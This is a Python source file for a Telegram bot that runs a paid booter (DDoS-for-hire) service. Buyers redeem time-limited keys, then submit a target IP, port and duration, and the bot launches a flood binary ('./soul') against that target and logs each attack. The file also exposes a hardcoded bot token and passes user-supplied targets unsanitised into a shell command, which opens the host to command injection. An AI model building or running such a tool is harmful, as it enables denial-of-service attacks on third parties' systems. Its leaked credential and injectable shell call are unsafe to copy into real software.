import os
import json
import random
import subprocess
from datetime import datetime, timedelta
from threading import Thread
import asyncio
import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread
import time
import random
from telebot.types import InputMediaPhoto

# Configuration
TOKEN = '7884986536:AAGmrPnWHMfFCw3S3ogSOyq0NkatKbTEzsw'
ADMIN_USER_ID = 5575401798
USERNAME = "@Vickyisonlive1"
bot = telebot.TeleBot(TOKEN)
DATA_FILE = 'Alone_boy.json'
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
attack_cooldown = {}

# Initialize data
def init_data():
    if not os.path.exists(DATA_FILE):
        data = {
            "users": {},
            "keys": {},
            "groups": [],
            "logs": []
        }
        with open(DATA_FILE, 'w') as f:
            json.dump(data, f, indent=4)

def load_data():
    init_data()
    with open(DATA_FILE, 'r') as f:
        return json.load(f)

def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# Keyboard Markups
def create_main_keyboard():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        KeyboardButton("⚡ 𝘼𝙏𝙏𝘼𝘾𝙆"),
        KeyboardButton("🔑 𝙍𝙀𝘿𝙀𝙀𝙈 𝙆𝙀𝙔"),
        KeyboardButton("🔐 𝙂𝙀𝙉𝙀𝙍𝘼𝙏𝙀 𝙆𝙀𝙔"),
        KeyboardButton("💎 𝙈𝙔 𝙋𝙇𝘼𝙉"),
        KeyboardButton("👑 𝙂𝙍𝙊𝙐𝙋 𝙈𝘼𝙉𝘼𝙂𝙀𝙈𝙀𝙉𝙏")
    ]
    markup.add(*buttons)
    return markup

def create_group_management_keyboard():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        KeyboardButton("➕ 𝘼𝘿𝘿 𝙂𝙍𝙊𝙐𝙋"),
        KeyboardButton("➖ 𝙍𝙀𝙈𝙊𝙑𝙀 𝙂𝙍𝙊𝙐𝙋"),
        KeyboardButton("📜 𝙇𝙄𝙎𝙏 𝙂𝙍𝙊𝙐𝙋𝙎"),
        KeyboardButton("🔙 𝘽𝘼𝘾𝙆 𝙈𝙀𝙉𝙐")
    ]
    markup.add(*buttons)
    return markup

def create_key_generation_keyboard():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        KeyboardButton("🔓 𝙉𝙊𝙍𝙈𝘼𝙇 𝙆𝙀𝙔"),
        KeyboardButton("💎 𝙑𝙄𝙋 𝙆𝙀𝙔"),
        KeyboardButton("🗑️ 𝘿𝙀𝙇𝙀𝙏𝙀 𝙆𝙀𝙔"),
        KeyboardButton("📜 𝙇𝙄𝙎𝙏 𝙆𝙀𝙔𝙎"),
        KeyboardButton("🔙 𝘽𝘼𝘾𝙆 𝙈𝙀𝙉𝙐")
    ]
    markup.add(*buttons)
    return markup

# Add this list of image URLs (replace with your actual image URLs)
START_IMAGES = [
    "https://www.rawpixel.com/image/16753171/full-moon-photography-clouds-romantic"
]

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    user = message.from_user
    username = f"@{user.username}" if user.username else user.first_name
    chat_id = message.chat.id
    
    # Get current date and time
    now = datetime.now()
    current_date = now.strftime("%d-%m-%Y")
    current_time = now.strftime("%H:%M:%S")
    
    # User info section
    user_info = f"""
┌───────────────────────
│ 🔸 *ID:* `{user.id}`
│ 🔸 *Username:* {username}
│ 🔸 *Account Age:* {get_account_age(user)}
└───────────────────────"""
    
    # Bot statistics
    data = load_data()
    active_users = len(data['users'])
    today_attacks = len([log for log in data['logs'] if datetime.now().date() == datetime.strptime(log['timestamp'], '%Y-%m-%d %H:%M:%S').date()])
    
    welcome_text = f"""
╭━━━〔 *𝗩𝗜𝗖𝗞𝗬 𝗫 𝗕𝗢𝗧 𝗣𝗔𝗡𝗘𝗟* 〕━━━╮
*"Military-Grade Network Access"*
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

⚡ *𝗦𝗧𝗔𝗧𝗨𝗦:* `{'PREMIUM' if str(user.id) in data['users'] else 'STANDARD'}`  
👋 Welcome, *{user.first_name}*

*─────⟪ 𝗨𝗦𝗘𝗥 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 ⟫─────*  
{user_info}

*─────⟪ 𝗦𝗬𝗦𝗧𝗘𝗠 𝗦𝗧𝗔𝗧𝗨𝗦 ⟫─────*
┌───────────────────────
│ 🔹 *Users:* {active_users}
│ 🔹 *Attacks Today:* {today_attacks}
│ 🔹 *Uptime:* 99.99%
└───────────────────────

📅 `{current_date}` | 🕒 `{current_time}`  
🔰 *𝗕𝗼𝘁 𝗢𝘄𝗻𝗲𝗿:* @Vickyisonlive1
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💎 *Buy VIP key for premium features!* 
💬 Contact: @Vickyisonlive1
"""

    # Send with random image
    try:
        bot.send_photo(
            chat_id,
            photo=random.choice(START_IMAGES),
            caption=welcome_text,
            parse_mode="Markdown",
            reply_markup=create_main_keyboard()
        )
    except:
        # Fallback without image
        bot.send_message(
            chat_id,
            welcome_text,
            parse_mode="Markdown",
            reply_markup=create_main_keyboard()
        )

def get_account_age(user):
    """Helper function to calculate account age"""
    if hasattr(user, 'date_created'):  # If available in user object
        delta = datetime.now() - user.date_created
        years = delta.days // 365
        months = (delta.days % 365) // 30
        days = (delta.days % 365) % 30
        return f"{years}y {months}m {days}d" if years > 0 else f"{months}m {days}d"
    return "Unknown"
        
        
# Group Management
@bot.message_handler(func=lambda msg: msg.text == "👑 𝙂𝙍𝙊𝙐𝙋 𝙈𝘼𝙉𝘼𝙂𝙀𝙈𝙀𝙉𝙏")
def handle_group_management(message):
    if message.from_user.id != ADMIN_USER_ID:
        bot.reply_to(message, "❌ You are not authorized to manage groups!")
        return
    bot.reply_to(message, "👑 *Group Management Panel* 👑", 
                parse_mode="Markdown", 
                reply_markup=create_group_management_keyboard())

@bot.message_handler(func=lambda msg: msg.text == "➕ 𝘼𝘿𝘿 𝙂𝙍𝙊𝙐𝙋")
def handle_add_group(message):
    if message.from_user.id != ADMIN_USER_ID:
        bot.reply_to(message, "❌ You are not authorized to add groups!")
        return
    msg = bot.reply_to(message, "📌 Send the Group ID to add:\n\nFormat: `-1001234567890`", parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_add_group)

def process_add_group(message):
    try:
        group_id = int(message.text.strip())
        data = load_data()
        if group_id in data['groups']:
            bot.reply_to(message, "⚠️ This group is already added!")
            return
        data['groups'].append(group_id)
        save_data(data)
        bot.reply_to(message, f"✅ Group Added Successfully!\n\nGroup ID: `{group_id}`", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ Error adding group: {str(e)}")

@bot.message_handler(func=lambda msg: msg.text == "➖ 𝙍𝙀𝙈𝙊𝙑𝙀 𝙂𝙍𝙊𝙐𝙋")
def handle_remove_group(message):
    if message.from_user.id != ADMIN_USER_ID:
        bot.reply_to(message, "❌ You are not authorized to remove groups!")
        return
    msg = bot.reply_to(message, "📌 Send the Group ID to remove:\n\nFormat: `-1001234567890`", parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_remove_group)

def process_remove_group(message):
    try:
        group_id = int(message.text.strip())
        data = load_data()
        if group_id in data['groups']:
            data['groups'].remove(group_id)
            save_data(data)
            bot.reply_to(message, f"✅ Group Removed Successfully!\n\nGroup ID: `{group_id}`", parse_mode="Markdown")
        else:
            bot.reply_to(message, "⚠️ Group not found in database!")
    except Exception as e:
        bot.reply_to(message, f"❌ Error removing group: {str(e)}")

@bot.message_handler(func=lambda msg: msg.text == "📜 𝙇𝙄𝙎𝙏 𝙂𝙍𝙊𝙐𝙋𝙎")
def handle_list_groups(message):
    if message.from_user.id != ADMIN_USER_ID:
        bot.reply_to(message, "❌ You are not authorized to view groups!")
        return
    data = load_data()
    if not data['groups']:
        bot.reply_to(message, "📭 No groups found in database!")
        return
    response = "📋 *List of Authorized Groups:*\n\n"
    for group_id in data['groups']:
        response += f"🆔 Group ID: `{group_id}`\n"
    bot.reply_to(message, response, parse_mode="Markdown")

# Key Generation
@bot.message_handler(func=lambda msg: msg.text == "🔐 𝙂𝙀𝙉𝙀𝙍𝘼𝙏𝙀 𝙆𝙀𝙔")
def handle_generate_key(message):
    if message.from_user.id != ADMIN_USER_ID:
        bot.reply_to(message, "❌ You are not authorized to generate keys!")
        return
    bot.reply_to(message, "🔐 *Key Generation Panel*", 
                parse_mode="Markdown", 
                reply_markup=create_key_generation_keyboard())

@bot.message_handler(func=lambda msg: msg.text == "🔓 𝙉𝙊𝙍𝙈𝘼𝙇 𝙆𝙀𝙔")
def handle_normal_key(message):
    msg = bot.reply_to(message, "⏳ Enter duration for NORMAL key (e.g., 1H, 2D, 1W):", parse_mode="Markdown")
    bot.register_next_step_handler(msg, generate_normal_key)

def generate_normal_key(message):
    try:
        duration_input = message.text.strip().upper()
        number = int(duration_input[:-1])
        suffix = duration_input[-1]
        duration_map = {'H': timedelta(hours=1), 'D': timedelta(days=1), 'W': timedelta(weeks=1)}
        
        if suffix not in duration_map:
            raise ValueError("Invalid duration suffix")
            
        expires_at = datetime.now() + number * duration_map[suffix]
        new_key = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=12))
        
        data = load_data()
        data['keys'][new_key] = {
            'key_type': 'NORMAL',
            'expires_at': expires_at.strftime('%Y-%m-%d %H:%M:%S'),
            'generated_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'used': False
        }
        save_data(data)
        
        bot.reply_to(message, f"""
🔓 *NORMAL KEY GENERATED*

🔑 *Key:* `{new_key}`
⏳ *Duration:* `{duration_input}`
📅 *Expires At:* `{expires_at.strftime('%Y-%m-%d %H:%M:%S')}`

💡 *Note:* This key can only be redeemed in authorized groups.
        """, parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ Error generating key: {str(e)}\n\nPlease use format like `1H`, `2D`, `1W`", parse_mode="Markdown")

@bot.message_handler(func=lambda msg: msg.text == "💎 𝙑𝙄𝙋 𝙆𝙀𝙔")
def handle_vip_key(message):
    msg = bot.reply_to(message, "⏳ Enter duration for VIP key (e.g., 1H, 2D, 1W):", parse_mode="Markdown")
    bot.register_next_step_handler(msg, generate_vip_key)

def generate_vip_key(message):
    try:
        duration_input = message.text.strip().upper()
        number = int(duration_input[:-1])
        suffix = duration_input[-1]
        duration_map = {'H': timedelta(hours=1), 'D': timedelta(days=1), 'W': timedelta(weeks=1)}
        
        if suffix not in duration_map:
            raise ValueError("Invalid duration suffix")
            
        expires_at = datetime.now() + number * duration_map[suffix]
        new_key = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=16))
        
        data = load_data()
        data['keys'][new_key] = {
            'key_type': 'VIP',
            'expires_at': expires_at.strftime('%Y-%m-%d %H:%M:%S'),
            'generated_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'used': False
        }
        save_data(data)
        
        bot.reply_to(message, f"""
💎 *VIP KEY GENERATED*

🔑 *Key:* `{new_key}`
⏳ *Duration:* `{duration_input}`
📅 *Expires At:* `{expires_at.strftime('%Y-%m-%d %H:%M:%S')}`

✨ *VIP Privileges:*
- Can be redeemed anywhere
- Higher priority access
- Extended features
        """, parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ Error generating key: {str(e)}\n\nPlease use format like `1H`, `2D`, `1W`", parse_mode="Markdown")

# Attack Functions
@bot.message_handler(func=lambda msg: msg.text == "⚡ 𝘼𝙏𝙏𝘼𝘾𝙆")
def attack_button(message):
    user_id = str(message.from_user.id)
    data = load_data()
    
    if user_id in data['users'] and datetime.strptime(data['users'][user_id]['plan_expires'], '%Y-%m-%d %H:%M:%S') > datetime.now():
        bot.send_chat_action(message.chat.id, 'typing')
        
        attack_panel = """
╔═══━━━─── • ───━━━═══╗
   ⚡ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗣𝗔𝗡𝗘𝗟  
╚═══━━━─── • ───━━━═══╝

⚡ *Ready to launch attack*
📌 *Format:* `IP PORT TIME`
💥 *Example:* `1.1.1.1 80 120`

🔥 *Max Duration:* 300 seconds
🔒 *Blocked Ports:* 443, 8700, etc.

▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
"""
        msg = bot.reply_to(message, attack_panel, parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_input, user_id)
    else:
        access_denied = """
╔═══━━━─── • ───━━━═══╗
   🔒 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗  
╚═══━━━─── • ───━━━═══╝

⚠️ *Premium Plan Required*
💎 Redeem a key to unlock attacks

✨ *Features:*
- Unlimited Attacks
- Priority Access
- VIP Support

Contact: @Vickyisonlive1
"""
        bot.reply_to(message, access_denied, parse_mode="Markdown")

def process_input(message, user_id):
    try:
        user_input = message.text.strip()
        parts = user_input.split()
        
        if len(parts) != 3:
            error_msg = """
╔═══━━━─── • ───━━━═══╗
   ❌ 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗙𝗢𝗥𝗠𝗔𝗧  
╚═══━━━─── • ───━━━═══╝

📌 *Correct Format:* `IP PORT TIME`
📝 *Example:* `1.1.1.1 80 120`

🔍 Please check and try again
"""
            bot.reply_to(message, error_msg, parse_mode="Markdown")
            return
        
        target_ip, port_str, duration_str = parts
        
        try:
            port = int(port_str)
            duration = int(duration_str)
        except ValueError:
            bot.reply_to(message, "⚠️ *Port and Time must be numbers!*", parse_mode="Markdown")
            return
        
        if port in blocked_ports:
            bot.reply_to(message, f"🚫 *Port {port} is blocked for security!*", parse_mode="Markdown")
            return
        
        if duration > 300:
            bot.reply_to(message, "⏳ *Max attack duration is 300 seconds!*", parse_mode="Markdown")
            return
        
        # Launch attack with stylish animation
        launch_attack(message, target_ip, port, duration, user_id)
        
    except Exception as e:
        bot.reply_to(message, f"💥 *Error:* `{str(e)}`", parse_mode="Markdown")

def launch_attack(message, target_ip, port, duration, user_id):
    # Record attack logs
    record_command_logs(user_id, '/pushpa', target_ip, port, duration)
    
    # ASCII Art for Attack Launch
    launch_art = """
╔═══━━━─── • ───━━━═══╗
   ⚡ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗  
╚═══━━━─── • ───━━━═══╝
"""
    
    # Attack Details
    attack_details = f"""
🎯 *Target:* `{target_ip}`
🔌 *Port:* `{port}`
⏱️ *Duration:* `{duration}s`
⚡ *Method:* `VICKY v2.1`
"""
    
    # Send initial attack message
    progress_msg = bot.send_message(
        message.chat.id, 
        f"{launch_art}{attack_details}\n{create_progress_bar(0)}", 
        parse_mode="Markdown"
    )
    
    # Run attack in background
    def execute_attack():
        subprocess.run(f"./soul {target_ip} {port} {duration} 200", shell=True)
    
    Thread(target=execute_attack).start()
    
    # Animate progress
    update_progress(message.chat.id, progress_msg.message_id, launch_art, attack_details, duration)

def update_progress(chat_id, msg_id, launch_art, attack_details, duration):
    for i in range(1, 101):
        time.sleep(duration/100)
        try:
            bot.edit_message_text(
                f"{launch_art}{attack_details}\n{create_progress_bar(i)}",
                chat_id=chat_id,
                message_id=msg_id,
                parse_mode="Markdown"
            )
        except:
            pass
    
    # Attack complete message
    complete_art = """
╔═══━━━─── • ───━━━═══╗
   ✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘  
╚═══━━━─── • ───━━━═══╝
"""
    bot.send_message(chat_id, f"{complete_art}\nAttack finished successfully!", parse_mode="Markdown")

def create_progress_bar(percentage):
    bars = "▰" * int(percentage/10)
    empty = "▱" * (10 - len(bars))
    return f"`[{bars}{empty}] {percentage}%`"

# Key Redemption
@bot.message_handler(func=lambda msg: msg.text == "🔑 𝙍𝙀𝘿𝙀𝙀𝙈 𝙆𝙀𝙔")
def handle_redeem_key_button(message):
    # Check if user is in an authorized group for NORMAL keys
    if message.chat.type in ['group', 'supergroup']:
        data = load_data()
        if message.chat.id not in data['groups']:
            bot.reply_to(message, """
🚫 *UNAUTHORIZED GROUP*

⚠️ This group is not authorized for key redemption.
💡 Please contact admin for assistance.
            """, parse_mode="Markdown")
            return
    
    bot.reply_to(message, """
🔐 *PREMIUM KEY REDEMPTION*

📌 Enter your premium key below:
📝 Example: `AB12CD34EF56GH78`
    """, parse_mode="Markdown")
    bot.register_next_step_handler(message, process_key_redeem)

def process_key_redeem(message):
    user_id = str(message.from_user.id)
    key_input = message.text.strip().upper()
    data = load_data()
    
    if key_input not in data['keys']:
        bot.reply_to(message, """
❌ *INVALID KEY*

⚠️ The key you entered is not valid.
🔍 Please check and try again.
        """, parse_mode="Markdown")
        return
    
    key_data = data['keys'][key_input]
    
    if key_data['used']:
        bot.reply_to(message, """
⚠️ *KEY ALREADY USED*

🔑 This key has already been redeemed.
💡 Each key can only be used once.
        """, parse_mode="Markdown")
        return
    
    if datetime.strptime(key_data['expires_at'], '%Y-%m-%d %H:%M:%S') < datetime.now():
        bot.reply_to(message, """
⌛ *KEY EXPIRED*

⏳ This key is no longer valid.
🔄 Please get a new key.
        """, parse_mode="Markdown")
        return
    
    # For NORMAL keys, verify group membership
    if key_data['key_type'] == 'NORMAL' and message.chat.type not in ['group', 'supergroup']:
        bot.reply_to(message, """
🚫 *REDEMPTION FAILED*

🔓 NORMAL keys can only be redeemed in authorized groups.
💎 Consider getting a VIP key for personal use.
        """, parse_mode="Markdown")
        return
    
    # Mark key as used
    data['keys'][key_input]['used'] = True
    data['keys'][key_input]['used_by'] = user_id
    data['keys'][key_input]['used_at'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Activate user plan
    data['users'][user_id] = {
        'plan_active': True,
        'plan_expires': key_data['expires_at'],
        'key_type': key_data['key_type']
    }
    
    save_data(data)
    
    # Success message
    bot.reply_to(message, f"""
🎉 *KEY REDEEMED SUCCESSFULLY!*

🔑 *Key Type:* `{key_data['key_type']}`
📅 *Expires At:* `{key_data['expires_at']}`

✨ *Enjoy your premium access!*
    """, parse_mode="Markdown")

# Key Delete Function
@bot.message_handler(func=lambda msg: msg.text == "🗑️ 𝘿𝙀𝙇𝙀𝙏𝙀 𝙆𝙀𝙔")
def handle_delete_key(message):
    if message.from_user.id != ADMIN_USER_ID:
        bot.reply_to(message, "❌ You are not authorized to delete keys!")
        return
    
    msg = bot.reply_to(message, """
🗑️ *ENTER KEY TO DELETE*

🔐 Format: `ABCDEF123456`
🔍 Example: `A1B2C3D4E5F6`
""", parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_delete_key)

def process_delete_key(message):
    try:
        key_to_delete = message.text.strip().upper()
        data = load_data()
        
        if key_to_delete not in data['keys']:
            bot.reply_to(message, "❌ Key not found in database!")
            return
            
        # Get key info before deleting
        key_type = data['keys'][key_to_delete]['key_type']
        expires_at = data['keys'][key_to_delete]['expires_at']
        
        # Delete the key
        del data['keys'][key_to_delete]
        save_data(data)
        
        bot.reply_to(message, f"""
✅ *KEY DELETED SUCCESSFULLY!*

🔑 *Key:* `{key_to_delete}`
📌 *Type:* {key_type}
⏳ *Expiry Date:* {expires_at}

⚠️ This key has been permanently deleted.
""", parse_mode="Markdown")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


@bot.message_handler(func=lambda msg: msg.text == "📜 𝙇𝙄𝙎𝙏 𝙆𝙀𝙔𝙎")
def handle_list_keys(message):
    if message.from_user.id != ADMIN_USER_ID:
        bot.reply_to(message, "❌ You are not authorized to view keys!")
        return
    
    data = load_data()
    if not data['keys']:
        bot.reply_to(message, "🔐 No keys found in database!")
        return
    
    # Sort keys by expiration date (newest first)
    sorted_keys = sorted(data['keys'].items(), 
                        key=lambda x: x[1]['expires_at'], 
                        reverse=True)
    
    # Prepare the response
    response = "🔐 *KEY DATABASE REPORT*\n\n"
    response += f"📅 Generated on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    response += f"🔑 Total Keys: {len(data['keys'])}\n"
    response += "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n"
    
    for key, key_data in sorted_keys:
        # Basic key info
        key_type = key_data['key_type']
        expires_at = datetime.strptime(key_data['expires_at'], '%Y-%m-%d %H:%M:%S')
        generated_at = datetime.strptime(key_data['generated_at'], '%Y-%m-%d %H:%M:%S')
        
        # Status info
        used = key_data.get('used', False)
        status = "🔴 EXPIRED" if expires_at < datetime.now() else \
                 "🟢 ACTIVE" if not used else \
                 "🔵 USED"
        
        # User info
        user_info = ""
        if 'used_by' in key_data:
            user_id = key_data['used_by']
            if user_id in data['users']:
                user_info = f"\n👤 User: {user_id}"
                # Try to get username if available
                try:
                    chat = bot.get_chat(user_id)
                    user_info = f"\n👤 User: @{chat.username}" if chat.username else f"\n👤 User: [ID: {user_id}]"
                except:
                    user_info = f"\n👤 User: [ID: {user_id}]"
        
        # Format time remaining
        time_left = ""
        if expires_at > datetime.now():
            delta = expires_at - datetime.now()
            days = delta.days
            hours = delta.seconds // 3600
            minutes = (delta.seconds % 3600) // 60
            time_left = f"\n⏳ Remaining: {days}d {hours}h {minutes}m"
        
        response += (
            f"▰ *Key:* `{key}`\n"
            f"   - Type: {key_type}\n"
            f"   - Status: {status}\n"
            f"   - Generated: {generated_at.strftime('%Y-%m-%d %H:%M')}\n"
            f"   - Expires: {expires_at.strftime('%Y-%m-%d %H:%M')}{time_left}"
            f"{user_info}\n\n"
        )
    
    # Add summary
    active_keys = sum(1 for k in data['keys'].values() 
                      if not k.get('used', False) and 
                      datetime.strptime(k['expires_at'], '%Y-%m-%d %H:%M:%S') > datetime.now())
    
    response += (
        "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
        f"📊 *Summary*\n"
        f"🟢 Active: {active_keys}\n"
        f"🔵 Used: {sum(1 for k in data['keys'].values() if k.get('used', False))}\n"
        f"🔴 Expired: {sum(1 for k in data['keys'].values() if datetime.strptime(k['expires_at'], '%Y-%m-%d %H:%M:%S') < datetime.now())}\n"
    )
    
    # Split long messages
    if len(response) > 4000:
        parts = [response[i:i+4000] for i in range(0, len(response), 4000)]
        for part in parts:
            bot.send_message(message.chat.id, part, parse_mode="Markdown")
            time.sleep(1)
    else:
        bot.reply_to(message, response, parse_mode="Markdown")

# Plan Information
@bot.message_handler(func=lambda msg: msg.text == "💎 𝙈𝙔 𝙋𝙇𝘼𝙉")
def handle_my_plan(message):
    user_id = str(message.from_user.id)
    data = load_data()
    
    if user_id in data['users'] and datetime.strptime(data['users'][user_id]['plan_expires'], '%Y-%m-%d %H:%M:%S') > datetime.now():
        user_data = data['users'][user_id]
        expires = user_data['plan_expires']
        key_type = user_data.get('key_type', 'NORMAL')
        
        bot.reply_to(message, f"""
💎 *YOUR PREMIUM PLAN*

🔑 *Plan Type:* `{key_type}`
⏳ *Expires At:* `{expires}`

✨ *Features:*
- Access to attack commands
- Priority support
- Regular updates
        """, parse_mode="Markdown")
    else:
        bot.reply_to(message, """
⚠️ *NO ACTIVE PLAN*

🔐 You don't have an active premium plan.
💡 Redeem a key to unlock all features.
        """, parse_mode="Markdown")

# Utility Functions
def record_command_logs(user_id, command, target_ip, port, duration):
    data = load_data()
    data['logs'].append({
        'user_id': user_id,
        'command': command,
        'target_ip': target_ip,
        'port': port,
        'duration': duration,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    })
    save_data(data)

def start_asyncio_thread():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_forever()

# Back Button Handler
@bot.message_handler(func=lambda msg: msg.text == "🔙 𝘽𝘼𝘾𝙆 𝙈𝙀𝙉𝙐")
def handle_back_button(message):
    bot.reply_to(message, "🔙 Returning to main menu...", 
                reply_markup=create_main_keyboard())

# Start the Bot
if __name__ == "__main__":
    print("»»—— VICKYISONLIVE ♥ power zone bot is running")
    init_data()
    
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Error: {str(e)}")
            time.sleep(5)